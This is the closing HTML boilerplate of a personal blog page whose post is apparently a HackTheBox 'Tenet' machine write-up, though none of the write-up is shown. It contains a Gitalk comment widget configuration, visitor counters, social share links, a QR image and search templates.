        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
        <h4 class="title">Spectra - Hackthebox</h4>
      </a>
    </div>
  
</nav>



    

















<section class="comments" id="comments">
    <div id="gitalk-container"></div>
    <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
    <script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
    <script>
        var id = location.pathname
        if (location.pathname.length > 50) {
          id = location.pathname.replace(/\/\d+\/\d+\/\d+\//, '').replace('/', '').substring(0, 50)
        }
        const gitalk = new Gitalk({
          clientID: 'cf0a9809323df14a9168',
          clientSecret: 'a30d7a21bf6d88b7ad5c1f5d1bfc45881c49b2ed',
          repo: 'LucifielHack.github.io',
          owner: 'LucifielHack',
          admin: ['LucifielHack'],
          id: id,      // Ensure uniqueness and length less than 50
          title: document.title.split('|')[0],
          distractionFreeMode: false  // Facebook-like distraction free mode
        })

        gitalk.render('gitalk-container')
    </script>
</section>




</article>



</div>

        <footer class="footer">
    <div class="top">
        
<p>
    <span id="busuanzi_container_site_uv" style='display:none'>
        站点总访客数：<span id="busuanzi_value_site_uv"></span>
    </span>
    <span id="busuanzi_container_site_pv" style='display:none'>
        站点总访问量：<span id="busuanzi_value_site_pv"></span>
    </span>
</p>


        <p>
            <!--- 
                <span><a href="/atom.xml" target="_blank" class="rss" title="rss"><i class="icon icon-lg icon-rss"></i></a></span>
            
            <span>footer.license</span> --->
        </p>
    </div>
    <div class="bottom">
        <p><span>Lucifiel &copy; 2020 - 2023</span>
            <span>
                
                Power by Lucifiel</a>
            </span>
        </p>
    </div>
</footer>

    </main>
    <div class="mask" id="mask"></div>
<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>



<div class="global-share" id="globalShare">
    <ul class="reset share-icons">
      <li>
        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/&title=《Tenet - Hackthebox》 — Lucifiel's Blog&pic=http://www.lucifiel.com/img/avatar.jpg" data-title="微博">
          <i class="icon icon-weibo"></i>
        </a>
      </li>
      <li>
        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
          <i class="icon icon-weixin"></i>
        </a>
      </li>
      <li>
        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/&title=《Tenet - Hackthebox》 — Lucifiel's Blog&source=Lucifiel 技术博客" data-title=" QQ">
          <i class="icon icon-qq"></i>
        </a>
      </li>
      <li>
        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/" data-title=" Facebook">
          <i class="icon icon-facebook"></i>
        </a>
      </li>
      <li>
        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Tenet - Hackthebox》 — Lucifiel's Blog&url=http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/&via=http://www.lucifiel.com" data-title=" Twitter">
          <i class="icon icon-twitter"></i>
        </a>
      </li>
      <li>
        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=http://www.lucifiel.com/2021/05/31/Hackthebox/Medium/Hackthebox-Tenet/" data-title=" Google+">
          <i class="icon icon-google-plus"></i>
        </a>
      </li>
    </ul>
 </div>


<div class="page-modal wx-share" id="wxShare">
    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
    <p>扫一扫，分享到微信</p>
    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAN4AAADeCAAAAAB3DOFrAAACwElEQVR42u3awW7jMAwE0P7/T+8Ce+qhTmZIqe0CL6fAcFw9HSx2yI+P+PPn3+fz96crn68/3f/6OckaDn/w8PDwRkt/+rxe4hM+geWbNbsHDw8P7zZvdhg8PeH1MzfgfM14eHh4v4E3g71+ueflMh4eHt7/zkte1skBkIcOeHh4eL+Nl/zzvwlb26K53eIDWQseHh5ezJs1wH72+/X+Hh4eHt6oq96+cPPodnNIFKvFw8PDu8Brw4Xkj+VNr+TJs1Pgo02R8fDw8OJfbUaa2uv5AEHyqyg+xsPDw7vAa5tVbUyQhLN5CZ7D8PDw8L6Ht08+T6XImwGvNyvBw8PDO8RrRweS0jnfmvxK/tdXkxF4eHh4QYWZh7ObEOHUpEMxnoWHh4d3mZe/rOs6vQwm6ojh6U48PDy8C7xNK2sznrUJI9riGw8PD+8sL19W2x47GzTkxX00GYGHh4d3jdeOC7TNqujUGiXTeHh4eLd5s+K1XehmZCov+g9kLXh4eHhlYrCJJDbPaRtms2EsPDw8vFO8tuU/G9VqD5U8jHhzMODh4eEd5eWFcovJ4+DZ8EFCxcPDw7vNa6ltxJC3zdo738yU4eHh4R3l5Y2uWbaRbF++ZQmvyFfw8PDw1rz8Jb5pU+1jiHwUDA8PD+8er40h2qiijYBnsXJxhODh4eEteLPidb+gNszNBxHw8PDwvpOX/LjltVnBgdB21jHDw8PDm9xZv7jziCHZytlK6gACDw8Pb807FSgkAUGOmY0vFJMReHh4eAvevv+eHAaz5lYbZ6xKfDw8PLySt2l3tfvXxh95RPK40Xh4eHjXeJtSeHZgbBhF1oKHh4f3o7y2SZZHDKdGE764Ew8PD+8X8PL2WF5Gb46WN0g8PDy8a7w8jNgHu20xnUe9X1zBw8PDu8BrG2A5qf2eHC0Hunl4eHh4c95fpmVK35J6b88AAAAASUVORK5CYII=" alt="微信分享二维码">
</div>




    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
<script>
var BLOG = { ROOT: '/', SHARE: true, REWARD: false };


</script>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>


<div class="search-panel" id="search-panel">
    <ul class="search-result" id="search-result"></ul>
</div>
<template id="search-tpl">
<li class="item">
    <a href="{path}" class="waves-block waves-effect">
        <div class="title ellipsis" title="{title}">{title}</div>
        <div class="flex-row flex-middle">
            <div class="tags ellipsis">
                {tags}
            </div>
            <time class="flex-col time">{date}</time>
        </div>
    </a>
</li>
</template>

<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>






<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->





</body>
</html>
